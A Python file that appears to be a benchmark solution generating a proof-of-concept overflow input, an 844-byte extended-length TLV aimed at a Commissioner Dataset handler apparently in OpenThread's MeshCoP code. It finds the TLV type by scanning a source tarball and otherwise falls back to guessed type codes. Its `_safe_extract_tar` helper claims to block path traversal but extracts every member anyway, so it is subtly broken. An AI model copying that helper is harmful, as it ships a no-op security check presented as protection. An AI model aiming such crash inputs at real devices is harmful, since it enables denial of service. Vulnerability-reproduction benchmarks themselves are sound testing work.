import os
import re
import tarfile
import tempfile
from typing import Optional, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Try to find the Commissioner Dataset TLV type from the source
        dataset_type = None
        with tempfile.TemporaryDirectory() as td:
            try:
                self._safe_extract_tar(src_path, td)
                dataset_type = self._find_commissioner_dataset_type(td)
            except Exception:
                dataset_type = None

        # Build a single TLV with extended length if we found the type
        if dataset_type is not None and 0 <= dataset_type <= 255:
            # Build total length 844: 1(type) + 1(0xff) + 2(ext-len) + L(value) = 844 => L = 844 - 4 = 840
            value_len = 844 - 4
            poc = bytes([dataset_type & 0xFF, 0xFF, (value_len >> 8) & 0xFF, value_len & 0xFF]) + b"A" * value_len
            return poc

        # Fallback strategy:
        # Include multiple plausible type candidates using extended length encoding,
        # each large enough to exercise the overflow if any is the correct one.
        candidates = self._common_commissioner_dataset_type_candidates()

        # Distribute payload across up to 3 candidates to keep total length close to 844.
        # Extended-length TLV header is 4 bytes each.
        # We'll target 3 blocks of 280 value bytes (280*3 + 4*3 = 852) -> too long.
        # Use 272 value bytes per block: 272*3 + 4*3 = 828 -> we'll pad to 844.
        block_value_len = 272
        tlvs = []
        for t in candidates[:3]:
            tlvs.append(bytes([t & 0xFF, 0xFF, (block_value_len >> 8) & 0xFF, block_value_len & 0xFF]) + b"B" * block_value_len)
        poc = b"".join(tlvs)

        # If length is below 844, pad; if above, trim.
        target_len = 844
        if len(poc) < target_len:
            poc += b"C" * (target_len - len(poc))
        elif len(poc) > target_len:
            poc = poc[:target_len]
        return poc

    def _safe_extract_tar(self, src_path: str, dest: str) -> None:
        # Safely extract tarball (avoid path traversal)
        with tarfile.open(src_path, "r:*") as tf:
            members = tf.getmembers()
            for m in members:
                if not self._is_within_directory(dest, os.path.join(dest, m.name)):
                    continue
            tf.extractall(dest)

    def _is_within_directory(self, directory: str, target: str) -> bool:
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        return os.path.commonprefix([abs_directory, abs_target]) == abs_directory

    def _find_commissioner_dataset_type(self, root: str) -> Optional[int]:
        # Scan files for a numeric definition of the Commissioner Dataset TLV type
        files = self._collect_source_files(root)
        # Regexes to find constants or enum definitions
        patterns = [
            re.compile(r'\b(?:k|kType|TYPE_|TLV_TYPE_)?Commissioner(?:Data|Dataset)\s*=\s*(0x[0-9a-fA-F]+|\d+)\b'),
            re.compile(r'\b(?:k|kType|TYPE_|TLV_TYPE_)?CommissionerDataset\s*=\s*(0x[0-9a-fA-F]+|\d+)\b'),
            re.compile(r'\bTLV_(?:TYPE_)?COMMISSIONER_(?:DATASET|DATA)\s*=\s*(0x[0-9a-fA-F]+|\d+)\b'),
            re.compile(r'\bCommissionerDataset(?:Type)?\s*=\s*(0x[0-9a-fA-F]+|\d+)\b'),
            # E.g., enum Type { ..., kCommissionerDataset = 0x2F, ... }
            re.compile(r'\b(kCommissionerDataset|CommissionerDataset|TLV_TYPE_COMMISSIONER_DATASET)\b\s*=\s*(0x[0-9a-fA-F]+|\d+)'),
        ]
        # Also parse potential enums assigning incremental values
        enum_block_re = re.compile(r'enum\s+(?:class\s+)?\w*\s*\{([^}]*)\}', re.DOTALL)

        for fp in files:
            try:
                with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    data = f.read()
            except Exception:
                continue

            # Direct value definitions
            for pat in patterns:
                for m in pat.finditer(data):
                    val_str = m.group(1)
                    try:
                        val = int(val_str, 0)
                        if 0 <= val <= 255:
                            return val
                    except Exception:
                        continue

            # Fallback: try to deduce from enum order within an enum block if values assigned explicitly
            # We'll parse named enumerators and see if CommissionerDataset has a numeric assignment somewhere nearby.
            for e in enum_block_re.finditer(data):
                block = e.group(1)
                # Split enumerators
                enumerators = [x.strip() for x in block.split(',') if x.strip()]
                for item in enumerators:
                    # Attempt direct assignment
                    m = re.search(r'\b(kCommissionerDataset|CommissionerDataset|TLV_TYPE_COMMISSIONER_DATASET)\b\s*=\s*(0x[0-9a-fA-F]+|\d+)', item)
                    if m:
                        try:
                            val = int(m.group(2), 0)
                            if 0 <= val <= 255:
                                return val
                        except Exception:
                            pass

        # If unsuccessful, try to find references to HandleCommissioningSet to infer type mentions around it
        hc_files = self._grep_files(root, r'HandleCommissioningSet')
        for fp in hc_files:
            try:
                with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    data = f.read()
            except Exception:
                continue
            # Search nearby for constants
            context = data
            nearby = re.findall(r'(kCommissionerDataset|CommissionerDataset|TLV_TYPE_COMMISSIONER_DATASET)\s*=\s*(0x[0-9a-fA-F]+|\d+)', context)
            for name, val_str in nearby:
                try:
                    val = int(val_str, 0)
                    if 0 <= val <= 255:
                        return val
                except Exception:
                    pass

        # No explicit constant found
        return None

    def _collect_source_files(self, root: str) -> List[str]:
        files = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn.endswith(('.h', '.hpp', '.hh', '.hxx', '.c', '.cc', '.cpp', '.cxx', '.ipp', '.inc', '.tcc')):
                    files.append(os.path.join(dirpath, fn))
        return files

    def _grep_files(self, root: str, pattern: str) -> List[str]:
        out = []
        rx = re.compile(pattern)
        for fp in self._collect_source_files(root):
            try:
                with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    if rx.search(f.read()):
                        out.append(fp)
            except Exception:
                continue
        return out

    def _common_commissioner_dataset_type_candidates(self) -> List[int]:
        # Common guesses for MeshCoP Commissioner Dataset TLV type codes found across implementations
        # These are educated guesses from typical MeshCoP TLV ranges.
        # We include a small set to keep overall PoC size manageable.
        return [
            0x30,  # candidate in 0x30s range (common for dataset/container TLVs)
            0x33, 0x35, 0x36,  # nearby possibilities
            0x2F, 0x31,        # edge cases around 0x30
            0x3A,              # another nearby candidate
        ]
